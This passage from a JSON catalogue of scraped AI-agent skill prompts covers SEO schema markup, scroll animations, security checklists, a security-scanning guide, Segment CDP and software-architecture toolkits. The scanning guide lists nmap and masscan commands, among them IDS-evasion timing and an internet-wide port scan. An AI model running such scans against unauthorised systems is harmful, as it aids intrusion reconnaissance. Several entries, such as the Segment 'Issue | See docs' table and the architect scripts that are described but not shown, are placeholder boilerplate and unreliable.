Technical Correctness            | 15      |\n| Maintenance & Sustainability     | 10      |\n| Spam / Policy Risk               | 5       |\n| **Total**                        | **100** |\n\n---\n\n### Category Definitions\n\n#### 1. Content–Schema Alignment (0–25)\n\n- Schema reflects **visible, user-facing content**\n- Marked entities actually exist on the page\n- No hidden or implied content\n\n**Automatic failure** if schema describes content not shown.\n\n---\n\n#### 2. Rich Result Eligibility (0–25)\n\n- Schema type is **supported by Google**\n- Page meets documented eligibility requirements\n- No known disqualifying patterns (e.g. self-serving reviews)\n\n---\n\n#### 3. Data Completeness & Accuracy (0–20)\n\n- All required properties present\n- Values are correct, current, and formatted properly\n- No placeholders or fabricated data\n\n---\n\n#### 4. Technical Correctness (0–15)\n\n- Valid JSON-LD\n- Correct nesting and types\n- No syntax, enum, or formatting errors\n\n---\n\n#### 5. Maintenance & Sustainability (0–10)\n\n- Data can be kept in sync with content\n- Updates won’t break schema\n- Suitable for templates if scaled\n\n---\n\n#### 6. Spam / Policy Risk (0–5)\n\n- No deceptive intent\n- No over-markup\n- No attempt to game rich results\n\n---\n\n### Eligibility Bands (Required)\n\n| Score  | Verdict               | Interpretation                        |\n| ------ | --------------------- | ------------------------------------- |\n| 85–100 | **Strong Candidate**  | Schema is appropriate and low risk    |\n| 70–84  | **Valid but Limited** | Use selectively, expect modest impact |\n| 55–69  | **High Risk**         | Implement only with strict controls   |\n| <55    | **Do Not Implement**  | Likely invalid or harmful             |\n\nIf verdict is **Do Not Implement**, stop and explain why.\n\n---\n\n## Phase 1: Page & Goal Assessment\n\n(Proceed only if score ≥ 70)\n\n### 1. Page Type\n\n- What kind of page is this?\n- Primary content entity\n- Single-entity vs multi-entity page\n\n### 2. Current State\n\n- Existing schema present?\n- Errors or warnings?\n- Rich results currently shown?\n\n### 3. Objective\n\n- Which rich result (if any) is targeted?\n- Expected benefit (CTR, clarity, trust)\n- Is schema _necessary_ to achieve this?\n\n---\n\n## Core Principles (Non-Negotiable)\n\n### 1. Accuracy Over Ambition\n\n- Schema must match visible content exactly\n- Do not “add content for schema”\n- Remove schema if content is removed\n\n---\n\n### 2. Google First, Schema.org Second\n\n- Follow **Google rich result documentation**\n- Schema.org allows more than Google supports\n- Unsupported types provide minimal SEO value\n\n---\n\n### 3. Minimal, Purposeful Markup\n\n- Add only schema that serves a clear purpose\n- Avoid redundant or decorative markup\n- More schema ≠ better SEO\n\n---\n\n### 4. Continuous Validation\n\n- Validate before deployment\n- Monitor Search Console enhancements\n- Fix errors promptly\n\n---\n\n## Supported & Common Schema Types\n\n_(Only implement when eligibility criteria are met.)_\n\n### Organization\n\nUse for: brand entity (homepage or about page)\n\n### WebSite (+ SearchAction)\n\nUse for: enabling sitelinks search box\n\n### Article / BlogPosting\n\nUse for: editorial content with authorship\n\n### Product\n\nUse for: real purchasable products\n**Must show price, availability, and offers visibly**\n\n---\n\n### SoftwareApplication\n\nUse for: SaaS apps and tools\n\n---\n\n### FAQPage\n\nUse only when:\n\n- Questions and answers are visible\n- Not used for promotional content\n- Not user-generated without moderation\n\n---\n\n### HowTo\n\nUse only for:\n\n- Genuine step-by-step instructional content\n- Not marketing funnels\n\n---\n\n### BreadcrumbList\n\nUse whenever breadcrumbs exist visually\n\n---\n\n### LocalBusiness\n\nUse for: real, physical business locations\n\n---\n\n### Review / AggregateRating\n\n**Strict rules:**\n\n- Reviews mu",
      "tags": [
        "react",
        "ai",
        "template",
        "design",
        "document",
        "seo",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:23.619Z"
    },
    {
      "id": "antigravity-scroll-experience",
      "name": "scroll-experience",
      "slug": "scroll-experience",
      "description": "Expert in building immersive scroll-driven experiences - parallax storytelling, scroll animations, interactive narratives, and cinematic web experiences. Like NY Times interactives, Apple product pages, and award-winning web experiences. Makes websites feel like experiences, not just pages. Use when",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/scroll-experience",
      "content": "\n# Scroll Experience\n\n**Role**: Scroll Experience Architect\n\nYou see scrolling as a narrative device, not just navigation. You create\nmoments of delight as users scroll. You know when to use subtle animations\nand when to go cinematic. You balance performance with visual impact. You\nmake websites feel like movies you control with your thumb.\n\n## Capabilities\n\n- Scroll-driven animations\n- Parallax storytelling\n- Interactive narratives\n- Cinematic web experiences\n- Scroll-triggered reveals\n- Progress indicators\n- Sticky sections\n- Scroll snapping\n\n## Patterns\n\n### Scroll Animation Stack\n\nTools and techniques for scroll animations\n\n**When to use**: When planning scroll-driven experiences\n\n```python\n## Scroll Animation Stack\n\n### Library Options\n| Library | Best For | Learning Curve |\n|---------|----------|----------------|\n| GSAP ScrollTrigger | Complex animations | Medium |\n| Framer Motion | React projects | Low |\n| Locomotive Scroll | Smooth scroll + parallax | Medium |\n| Lenis | Smooth scroll only | Low |\n| CSS scroll-timeline | Simple, native | Low |\n\n### GSAP ScrollTrigger Setup\n```javascript\nimport { gsap } from 'gsap';\nimport { ScrollTrigger } from 'gsap/ScrollTrigger';\n\ngsap.registerPlugin(ScrollTrigger);\n\n// Basic scroll animation\ngsap.to('.element', {\n  scrollTrigger: {\n    trigger: '.element',\n    start: 'top center',\n    end: 'bottom center',\n    scrub: true, // Links animation to scroll position\n  },\n  y: -100,\n  opacity: 1,\n});\n```\n\n### Framer Motion Scroll\n```jsx\nimport { motion, useScroll, useTransform } from 'framer-motion';\n\nfunction ParallaxSection() {\n  const { scrollYProgress } = useScroll();\n  const y = useTransform(scrollYProgress, [0, 1], [0, -200]);\n\n  return (\n    <motion.div style={{ y }}>\n      Content moves with scroll\n    </motion.div>\n  );\n}\n```\n\n### CSS Native (2024+)\n```css\n@keyframes reveal {\n  from { opacity: 0; transform: translateY(50px); }\n  to { opacity: 1; transform: translateY(0); }\n}\n\n.animate-on-scroll {\n  animation: reveal linear;\n  animation-timeline: view();\n  animation-range: entry 0% cover 40%;\n}\n```\n```\n\n### Parallax Storytelling\n\nTell stories through scroll depth\n\n**When to use**: When creating narrative experiences\n\n```javascript\n## Parallax Storytelling\n\n### Layer Speeds\n| Layer | Speed | Effect |\n|-------|-------|--------|\n| Background | 0.2x | Far away, slow |\n| Midground | 0.5x | Middle depth |\n| Foreground | 1.0x | Normal scroll |\n| Content | 1.0x | Readable |\n| Floating elements | 1.2x | Pop forward |\n\n### Creating Depth\n```javascript\n// GSAP parallax layers\ngsap.to('.background', {\n  scrollTrigger: {\n    scrub: true\n  },\n  y: '-20%', // Moves slower\n});\n\ngsap.to('.foreground', {\n  scrollTrigger: {\n    scrub: true\n  },\n  y: '-50%', // Moves faster\n});\n```\n\n### Story Beats\n```\nSection 1: Hook (full viewport, striking visual)\n    ↓ scroll\nSection 2: Context (text + supporting visuals)\n    ↓ scroll\nSection 3: Journey (parallax storytelling)\n    ↓ scroll\nSection 4: Climax (dramatic reveal)\n    ↓ scroll\nSection 5: Resolution (CTA or conclusion)\n```\n\n### Text Reveals\n- Fade in on scroll\n- Typewriter effect on trigger\n- Word-by-word highlight\n- Sticky text with changing visuals\n```\n\n### Sticky Sections\n\nPin elements while scrolling through content\n\n**When to use**: When content should stay visible during scroll\n\n```javascript\n## Sticky Sections\n\n### CSS Sticky\n```css\n.sticky-container {\n  height: 300vh; /* Space for scrolling */\n}\n\n.sticky-element {\n  position: sticky;\n  top: 0;\n  height: 100vh;\n}\n```\n\n### GSAP Pin\n```javascript\ngsap.to('.content', {\n  scrollTrigger: {\n    trigger: '.section',\n    pin: true, // Pins the section\n    start: 'top top',\n    end: '+=1000', // Pin for 1000px of scroll\n    scrub: true,\n  },\n  // Animate while pinned\n  x: '-100vw',\n});\n```\n\n### Horizontal Scroll Section\n```javascript\nconst sections = gsap.utils.toArray('.panel');\n\ngsap.to(sections, {\n  xPercent: -100 * (sections.length - 1),\n  ease: 'none',\n  scrollTrigger: {\n    trigger: '.horizontal-container',\n    pin: true,\n    scrub: 1,\n    end: () => '+=' + document.querySelector('.horizontal-container').offsetWidth,\n  },\n});\n```\n\n### Use Cases\n- Product feature walkthrough\n- Before/after comparisons\n- Step-by-step processes\n- Image galleries\n```\n\n## Anti-Patterns\n\n### ❌ Scroll Hijacking\n\n**Why bad**: Users hate losing scroll control.\nAccessibility nightmare.\nBreaks back button expectations.\nFrustrating on mobile.\n\n**Instead**: Enhance scroll, don't replace it.\nKeep natural scroll speed.\nUse scrub animations.\nAllow users to scroll normally.\n\n### ❌ Animation Overload\n\n**Why bad**: Distracting, not delightful.\nPerformance tanks.\nContent becomes secondary.\nUser fatigue.\n\n**Instead**: Less is more.\nAnimate key moments.\nStatic content is okay.\nGuide attention, don't overwhelm.\n\n### ❌ Desktop-Only Experience\n\n**Why bad**: Mobile is majority of traffic.\nTouch scroll is different.\nPerformance issues on phones.\nUnusable experience.\n\n**Instead**: Mobile-first scroll design.\nSimpler effects ",
      "tags": [
        "python",
        "javascript",
        "react",
        "ai",
        "design",
        "document",
        "image",
        "cro"
      ],
      "useCases": [
        "Product feature walkthrough",
        "Before/after comparisons",
        "Step-by-step processes",
        "Image galleries"
      ],
      "scrapedAt": "2026-01-26T13:21:24.786Z"
    },
    {
      "id": "openhands-security",
      "name": "security",
      "slug": "security",
      "description": "This document provides guidance on security best practices",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/security.md",
      "content": "This document provides guidance on security best practices\n\nYou should always be considering security implications when developing.\nYou should always complete the task requested. If there are security concerns please address them in-line if possible or ensure they are communicated either in code comments, PR comments, or other appropriate channels.\n\n## Core Security Principles\n- Always use secure communication protocols (HTTPS, SSH, etc.)\n- Never store sensitive data (passwords, tokens, keys) in code or version control unless given explicit permission.\n- Apply the principle of least privilege\n- Validate and sanitize all user inputs\n\n## Common Security Checks\n- Ensure proper authentication and authorization mechanisms\n- Verify secure session management\n- Confirm secure storage of sensitive data\n- Validate secure configuration of services and APIs\n\n## Error Handling\n- Never expose sensitive information in error messages\n- Log security events appropriately\n- Implement proper exception handling\n- Use secure error reporting mechanisms\n",
      "tags": [
        "pr",
        "agent",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:32.057Z"
    },
    {
      "id": "antigravity-scanning-tools",
      "name": "Security Scanning Tools",
      "slug": "scanning-tools",
      "description": "This skill should be used when the user asks to \"perform vulnerability scanning\", \"scan networks for open ports\", \"assess web application security\", \"scan wireless networks\", \"detect malware\", \"check cloud security\", or \"evaluate system compliance\". It provides comprehensive guidance on security sca",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/scanning-tools",
      "content": "\n# Security Scanning Tools\n\n## Purpose\n\nMaster essential security scanning tools for network discovery, vulnerability assessment, web application testing, wireless security, and compliance validation. This skill covers tool selection, configuration, and practical usage across different scanning categories.\n\n## Prerequisites\n\n### Required Environment\n- Linux-based system (Kali Linux recommended)\n- Network access to target systems\n- Proper authorization for scanning activities\n\n### Required Knowledge\n- Basic networking concepts (TCP/IP, ports, protocols)\n- Understanding of common vulnerabilities\n- Familiarity with command-line interfaces\n\n## Outputs and Deliverables\n\n1. **Network Discovery Reports** - Identified hosts, ports, and services\n2. **Vulnerability Assessment Reports** - CVEs, misconfigurations, risk ratings\n3. **Web Application Security Reports** - OWASP Top 10 findings\n4. **Compliance Reports** - CIS benchmarks, PCI-DSS, HIPAA checks\n\n## Core Workflow\n\n### Phase 1: Network Scanning Tools\n\n#### Nmap (Network Mapper)\n\nPrimary tool for network discovery and security auditing:\n\n```bash\n# Host discovery\nnmap -sn 192.168.1.0/24              # Ping scan (no port scan)\nnmap -sL 192.168.1.0/24              # List scan (DNS resolution)\nnmap -Pn 192.168.1.100               # Skip host discovery\n\n# Port scanning techniques\nnmap -sS 192.168.1.100               # TCP SYN scan (stealth)\nnmap -sT 192.168.1.100               # TCP connect scan\nnmap -sU 192.168.1.100               # UDP scan\nnmap -sA 192.168.1.100               # ACK scan (firewall detection)\n\n# Port specification\nnmap -p 80,443 192.168.1.100         # Specific ports\nnmap -p- 192.168.1.100               # All 65535 ports\nnmap -p 1-1000 192.168.1.100         # Port range\nnmap --top-ports 100 192.168.1.100   # Top 100 common ports\n\n# Service and OS detection\nnmap -sV 192.168.1.100               # Service version detection\nnmap -O 192.168.1.100                # OS detection\nnmap -A 192.168.1.100                # Aggressive (OS, version, scripts)\n\n# Timing and performance\nnmap -T0 192.168.1.100               # Paranoid (slowest, IDS evasion)\nnmap -T4 192.168.1.100               # Aggressive (faster)\nnmap -T5 192.168.1.100               # Insane (fastest)\n\n# NSE Scripts\nnmap --script=vuln 192.168.1.100     # Vulnerability scripts\nnmap --script=http-enum 192.168.1.100  # Web enumeration\nnmap --script=smb-vuln* 192.168.1.100  # SMB vulnerabilities\nnmap --script=default 192.168.1.100  # Default script set\n\n# Output formats\nnmap -oN scan.txt 192.168.1.100      # Normal output\nnmap -oX scan.xml 192.168.1.100      # XML output\nnmap -oG scan.gnmap 192.168.1.100    # Grepable output\nnmap -oA scan 192.168.1.100          # All formats\n```\n\n#### Masscan\n\nHigh-speed port scanning for large networks:\n\n```bash\n# Basic scanning\nmasscan -p80 192.168.1.0/24 --rate=1000\nmasscan -p80,443,8080 192.168.1.0/24 --rate=10000\n\n# Full port range\nmasscan -p0-65535 192.168.1.0/24 --rate=5000\n\n# Large-scale scanning\nmasscan 0.0.0.0/0 -p443 --rate=100000 --excludefile exclude.txt\n\n# Output formats\nmasscan -p80 192.168.1.0/24 -oG results.gnmap\nmasscan -p80 192.168.1.0/24 -oJ results.json\nmasscan -p80 192.168.1.0/24 -oX results.xml\n\n# Banner grabbing\nmasscan -p80 192.168.1.0/24 --banners\n```\n\n### Phase 2: Vulnerability Scanning Tools\n\n#### Nessus\n\nEnterprise-grade vulnerability assessment:\n\n```bash\n# Start Nessus service\nsudo systemctl start nessusd\n\n# Access web interface\n# https://localhost:8834\n\n# Command-line (nessuscli)\nnessuscli scan --create --name \"Internal Scan\" --targets 192.168.1.0/24\nnessuscli scan --list\nnessuscli scan --launch <scan_id>\nnessuscli report --format pdf --output report.pdf <scan_id>\n```\n\nKey Nessus features:\n- Comprehensive CVE detection\n- Compliance checks (PCI-DSS, HIPAA, CIS)\n- Custom scan templates\n- Credentialed scanning for deeper analysis\n- Regular plugin updates\n\n#### OpenVAS (Greenbone)\n\nOpen-source vulnerability scanning:\n\n```bash\n# Install OpenVAS\nsudo apt install openvas\nsudo gvm-setup\n\n# Start services\nsudo gvm-start\n\n# Access web interface (Greenbone Security Assistant)\n# https://localhost:9392\n\n# Command-line operations\ngvm-cli socket --xml \"<get_version/>\"\ngvm-cli socket --xml \"<get_tasks/>\"\n\n# Create and run scan\ngvm-cli socket --xml '\n<create_target>\n  <name>Test Target</name>\n  <hosts>192.168.1.0/24</hosts>\n</create_target>'\n```\n\n### Phase 3: Web Application Scanning Tools\n\n#### Burp Suite\n\nComprehensive web application testing:\n\n```\n# Proxy configuration\n1. Set browser proxy to 127.0.0.1:8080\n2. Import Burp CA certificate for HTTPS\n3. Add target to scope\n\n# Key modules:\n- Proxy: Intercept and modify requests\n- Spider: Crawl web applications\n- Scanner: Automated vulnerability detection\n- Intruder: Automated attacks (fuzzing, brute-force)\n- Repeater: Manual request manipulation\n- Decoder: Encode/decode data\n- Comparer: Compare responses\n```\n\nCore testing workflow:\n1. Configure proxy and scope\n2. Spider the application\n3. Analyze sitemap\n4. R",
      "tags": [
        "pdf",
        "api",
        "ai",
        "automation",
        "workflow",
        "template",
        "document",
        "security",
        "vulnerability",
        "docker"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:22.475Z"
    },
    {
      "id": "antigravity-cc-skill-security-review",
      "name": "security-review",
      "slug": "cc-skill-security-review",
      "description": "Use this skill when adding authentication, handling user input, working with secrets, creating API endpoints, or implementing payment/sensitive features. Provides comprehensive security checklist and patterns.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-security-review",
      "content": "\n# Security Review Skill\n\nThis skill ensures all code follows security best practices and identifies potential vulnerabilities.\n\n## When to Activate\n\n- Implementing authentication or authorization\n- Handling user input or file uploads\n- Creating new API endpoints\n- Working with secrets or credentials\n- Implementing payment features\n- Storing or transmitting sensitive data\n- Integrating third-party APIs\n\n## Security Checklist\n\n### 1. Secrets Management\n\n#### ❌ NEVER Do This\n```typescript\nconst apiKey = \"sk-proj-xxxxx\"  // Hardcoded secret\nconst dbPassword = \"password123\" // In source code\n```\n\n#### ✅ ALWAYS Do This\n```typescript\nconst apiKey = process.env.OPENAI_API_KEY\nconst dbUrl = process.env.DATABASE_URL\n\n// Verify secrets exist\nif (!apiKey) {\n  throw new Error('OPENAI_API_KEY not configured')\n}\n```\n\n#### Verification Steps\n- [ ] No hardcoded API keys, tokens, or passwords\n- [ ] All secrets in environment variables\n- [ ] `.env.local` in .gitignore\n- [ ] No secrets in git history\n- [ ] Production secrets in hosting platform (Vercel, Railway)\n\n### 2. Input Validation\n\n#### Always Validate User Input\n```typescript\nimport { z } from 'zod'\n\n// Define validation schema\nconst CreateUserSchema = z.object({\n  email: z.string().email(),\n  name: z.string().min(1).max(100),\n  age: z.number().int().min(0).max(150)\n})\n\n// Validate before processing\nexport async function createUser(input: unknown) {\n  try {\n    const validated = CreateUserSchema.parse(input)\n    return await db.users.create(validated)\n  } catch (error) {\n    if (error instanceof z.ZodError) {\n      return { success: false, errors: error.errors }\n    }\n    throw error\n  }\n}\n```\n\n#### File Upload Validation\n```typescript\nfunction validateFileUpload(file: File) {\n  // Size check (5MB max)\n  const maxSize = 5 * 1024 * 1024\n  if (file.size > maxSize) {\n    throw new Error('File too large (max 5MB)')\n  }\n\n  // Type check\n  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif']\n  if (!allowedTypes.includes(file.type)) {\n    throw new Error('Invalid file type')\n  }\n\n  // Extension check\n  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif']\n  const extension = file.name.toLowerCase().match(/\\.[^.]+$/)?.[0]\n  if (!extension || !allowedExtensions.includes(extension)) {\n    throw new Error('Invalid file extension')\n  }\n\n  return true\n}\n```\n\n#### Verification Steps\n- [ ] All user inputs validated with schemas\n- [ ] File uploads restricted (size, type, extension)\n- [ ] No direct use of user input in queries\n- [ ] Whitelist validation (not blacklist)\n- [ ] Error messages don't leak sensitive info\n\n### 3. SQL Injection Prevention\n\n#### ❌ NEVER Concatenate SQL\n```typescript\n// DANGEROUS - SQL Injection vulnerability\nconst query = `SELECT * FROM users WHERE email = '${userEmail}'`\nawait db.query(query)\n```\n\n#### ✅ ALWAYS Use Parameterized Queries\n```typescript\n// Safe - parameterized query\nconst { data } = await supabase\n  .from('users')\n  .select('*')\n  .eq('email', userEmail)\n\n// Or with raw SQL\nawait db.query(\n  'SELECT * FROM users WHERE email = $1',\n  [userEmail]\n)\n```\n\n#### Verification Steps\n- [ ] All database queries use parameterized queries\n- [ ] No string concatenation in SQL\n- [ ] ORM/query builder used correctly\n- [ ] Supabase queries properly sanitized\n\n### 4. Authentication & Authorization\n\n#### JWT Token Handling\n```typescript\n// ❌ WRONG: localStorage (vulnerable to XSS)\nlocalStorage.setItem('token', token)\n\n// ✅ CORRECT: httpOnly cookies\nres.setHeader('Set-Cookie',\n  `token=${token}; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`)\n```\n\n#### Authorization Checks\n```typescript\nexport async function deleteUser(userId: string, requesterId: string) {\n  // ALWAYS verify authorization first\n  const requester = await db.users.findUnique({\n    where: { id: requesterId }\n  })\n\n  if (requester.role !== 'admin') {\n    return NextResponse.json(\n      { error: 'Unauthorized' },\n      { status: 403 }\n    )\n  }\n\n  // Proceed with deletion\n  await db.users.delete({ where: { id: userId } })\n}\n```\n\n#### Row Level Security (Supabase)\n```sql\n-- Enable RLS on all tables\nALTER TABLE users ENABLE ROW LEVEL SECURITY;\n\n-- Users can only view their own data\nCREATE POLICY \"Users view own data\"\n  ON users FOR SELECT\n  USING (auth.uid() = id);\n\n-- Users can only update their own data\nCREATE POLICY \"Users update own data\"\n  ON users FOR UPDATE\n  USING (auth.uid() = id);\n```\n\n#### Verification Steps\n- [ ] Tokens stored in httpOnly cookies (not localStorage)\n- [ ] Authorization checks before sensitive operations\n- [ ] Row Level Security enabled in Supabase\n- [ ] Role-based access control implemented\n- [ ] Session management secure\n\n### 5. XSS Prevention\n\n#### Sanitize HTML\n```typescript\nimport DOMPurify from 'isomorphic-dompurify'\n\n// ALWAYS sanitize user-provided HTML\nfunction renderUserContent(html: string) {\n  const clean = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],\n    ALLOWED_ATTR: []\n  })\n  return <div dangerouslySetInnerHTML={{",
      "tags": [
        "typescript",
        "react",
        "nextjs",
        "api",
        "ai",
        "image",
        "security",
        "vulnerability",
        "supabase",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:26.835Z"
    },
    {
      "id": "antigravity-segment-cdp",
      "name": "segment-cdp",
      "slug": "segment-cdp",
      "description": "Expert patterns for Segment Customer Data Platform including Analytics.js, server-side tracking, tracking plans with Protocols, identity resolution, destinations configuration, and data governance best practices. Use when: segment, analytics.js, customer data platform, cdp, tracking plan.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/segment-cdp",
      "content": "\n# Segment CDP\n\n## Patterns\n\n### Analytics.js Browser Integration\n\nClient-side tracking with Analytics.js. Include track, identify, page,\nand group calls. Anonymous ID persists until identify merges with user.\n\n\n### Server-Side Tracking with Node.js\n\nHigh-performance server-side tracking using @segment/analytics-node.\nNon-blocking with internal batching. Essential for backend events,\nwebhooks, and sensitive data.\n\n\n### Tracking Plan Design\n\nDesign event schemas using Object + Action naming convention.\nDefine required properties, types, and validation rules.\nConnect to Protocols for enforcement.\n\n\n## Anti-Patterns\n\n### ❌ Dynamic Event Names\n\n### ❌ Tracking Properties as Events\n\n### ❌ Missing Identify Before Track\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | medium | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | high | See docs |\n| Issue | low | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | high | See docs |\n",
      "tags": [
        "node",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:25.993Z"
    },
    {
      "id": "antigravity-senior-architect",
      "name": "senior-architect",
      "slug": "senior-architect",
      "description": "Comprehensive software architecture skill for designing scalable, maintainable systems using ReactJS, NextJS, NodeJS, Express, React Native, Swift, Kotlin, Flutter, Postgres, GraphQL, Go, Python. Includes architecture diagram generation, system design patterns, tech stack decision frameworks, and de",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/senior-architect",
      "content": "\n# Senior Architect\n\nComplete toolkit for senior architect with modern tools and best practices.\n\n## Quick Start\n\n### Main Capabilities\n\nThis skill provides three core capabilities through automated scripts:\n\n```bash\n# Script 1: Architecture Diagram Generator\npython scripts/architecture_diagram_generator.py [options]\n\n# Script 2: Project Architect\npython scripts/project_architect.py [options]\n\n# Script 3: Dependency Analyzer\npython scripts/dependency_analyzer.py [options]\n```\n\n## Core Capabilities\n\n### 1. Architecture Diagram Generator\n\nAutomated tool for architecture diagram generator tasks.\n\n**Features:**\n- Automated scaffolding\n- Best practices built-in\n- Configurable templates\n- Quality checks\n\n**Usage:**\n```bash\npython scripts/architecture_diagram_generator.py <project-path> [options]\n```\n\n### 2. Project Architect\n\nComprehensive analysis and optimization tool.\n\n**Features:**\n- Deep analysis\n- Performance metrics\n- Recommendations\n- Automated fixes\n\n**Usage:**\n```bash\npython scripts/project_architect.py <target-path> [--verbose]\n```\n\n### 3. Dependency Analyzer\n\nAdvanced tooling for specialized tasks.\n\n**Features:**\n- Expert-level automation\n- Custom configurations\n- Integration ready\n- Production-grade output\n\n**Usage:**\n```bash\npython scripts/dependency_analyzer.py [arguments] [options]\n```\n\n## Reference Documentation\n\n### Architecture Patterns\n\nComprehensive guide available in `references/architecture_patterns.md`:\n\n- Detailed patterns and practices\n- Code examples\n- Best practices\n- Anti-patterns to avoid\n- Real-world scenarios\n\n### System Design Workflows\n\nComplete workflow documentation in `references/system_design_workflows.md`:\n\n- Step-by-step processes\n- Optimization strategies\n- Tool integrations\n- Performance tuning\n- Troubleshooting guide\n\n### Tech Decision Guide\n\nTechnical reference guide in `references/tech_decision_guide.md`:\n\n- Technology stack details\n- Configuration examples\n- Integration patterns\n- Security considerations\n- Scalability guidelines\n\n## Tech Stack\n\n**Languages:** TypeScript, JavaScript, Python, Go, Swift, Kotlin\n**Frontend:** React, Next.js, React Native, Flutter\n**Backend:** Node.js, Express, GraphQL, REST APIs\n**Database:** PostgreSQL, Prisma, NeonDB, Supabase\n**DevOps:** Docker, Kubernetes, Terraform, GitHub Actions, CircleCI\n**Cloud:** AWS, GCP, Azure\n\n## Development Workflow\n\n### 1. Setup and Configuration\n\n```bash\n# Install dependencies\nnpm install\n# or\npip install -r requirements.txt\n\n# Configure environment\ncp .env.example .env\n```\n\n### 2. Run Quality Checks\n\n```bash\n# Use the analyzer script\npython scripts/project_architect.py .\n\n# Review recommendations\n# Apply fixes\n```\n\n### 3. Implement Best Practices\n\nFollow the patterns and practices documented in:\n- `references/architecture_patterns.md`\n- `references/system_design_workflows.md`\n- `references/tech_decision_guide.md`\n\n## Best Practices Summary\n\n### Code Quality\n- Follow established patterns\n- Write comprehensive tests\n- Document decisions\n- Review regularly\n\n### Performance\n- Measure before optimizing\n- Use appropriate caching\n- Optimize critical paths\n- Monitor in production\n\n### Security\n- Validate all inputs\n- Use parameterized queries\n- Implement proper authentication\n- Keep dependencies updated\n\n### Maintainability\n- Write clear code\n- Use consistent naming\n- Add helpful comments\n- Keep it simple\n\n## Common Commands\n\n```bash\n# Development\nnpm run dev\nnpm run build\nnpm run test\nnpm run lint\n\n# Analysis\npython scripts/project_architect.py .\npython scripts/dependency_analyzer.py --analyze\n\n# Deployment\ndocker build -t app:latest .\ndocker-compose up -d\nkubectl apply -f k8s/\n```\n\n## Troubleshooting\n\n### Common Issues\n\nCheck the comprehensive troubleshooting section in `references/tech_decision_guide.md`.\n\n### Getting Help\n\n- Review reference documentation\n- Check script output messages\n- Consult tech stack documentation\n- Review error logs\n\n## Resources\n\n- Pattern Reference: `references/architecture_patterns.md`\n- Workflow Guide: `references/system_design_workflows.md`\n- Technical Guide: `references/tech_decision_guide.md`\n- Tool Scripts: `scripts/` directory\n",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "react",
        "node",
        "nextjs",
        "api",
        "ai",
        "automation",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:27.208Z"
    },
    {
      "id": "antigravity-senior-fullstack",
      "name": "senior-fullstack",
      "slug": "senior-fullstack",
      "description": "Comprehensive fullstack development skill for building complete web applications with React, Next.js, Node.js, GraphQL, and PostgreSQL. Includes project scaffolding, code quality analysis, architecture patterns, and complete tech stack guidance. Use when building new projects, analyzing code quality",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/senior-fullstack",
      "content": "\n# Senior Fullstack\n\nComplete toolkit for senior fullstack with modern tools and best practices.\n\n## Quick Start\n\n### Main Capabilities\n\nThis skill provides three core capabilities through automated scripts:\n\n```bash\n# Script 1: Fullstack Scaffolder\npython scripts/fullstack_scaffolder.py [options]\n\n# Script 2: Project Scaffolder\npython scripts/project_scaffolder.py [options]\n\n# Script 3: Code Quality Analyzer\npython scripts/code_quality_analyzer.py [options]\n```\n\n## Core Capabilities\n\n### 1. Fullstack Scaffolder\n\nAutomated tool for fullstack scaffolder tasks.\n\n**Features:**\n- Automated scaffolding\n- Best practices built-in\n- Configurable templates\n- Quality checks\n\n**Usage:**\n```bash\npython scripts/fullstack_scaffolder.py <project-path> [options]\n```\n\n### 2. Project Scaffolder\n\nComprehensive analysis and optimization tool.\n\n**Features:**\n- Deep analysis\n- Performance metrics\n- Recommendations\n- Automated fixes\n\n**Usage:**\n```bash\npython scripts/project_scaffolder.py <target-path> [--verbose]\n```\n\n### 3. Code Quality Analyzer\n\nAdvanced tooling for specialized tasks.\n\n**Features:**\n- Expert-level automation\n- Custom configurations\n- Integration ready\n- Production-grade output\n\n**Usage:**\n```bash\npython scripts/code_quality_analyzer.py [arguments] [options]\n```\n\n## Reference Documentation\n\n### Tech Stack Guide\n\nComprehensive guide available in `references/tech_stack_guide.md`:\n\n- Detailed patterns and practices\n- Code examples\n- Best practices\n- Anti-patterns to avoid\n- Real-world scenarios\n\n### Architecture Patterns\n\nComplete workflow documentation in `references/architecture_patterns.md`:\n\n- Step-by-step processes\n- Optimization strategies\n- Tool integrations\n- Performance tuning\n- Troubleshooting guide\n\n### Development Workflows\n\nTechnical reference guide in `references/development_workflows.md`:\n\n- Technology stack details\n- Configuration examples\n- Integration patterns\n- Security considerations\n- Scalability guidelines\n\n## Tech Stack\n\n**Languages:** 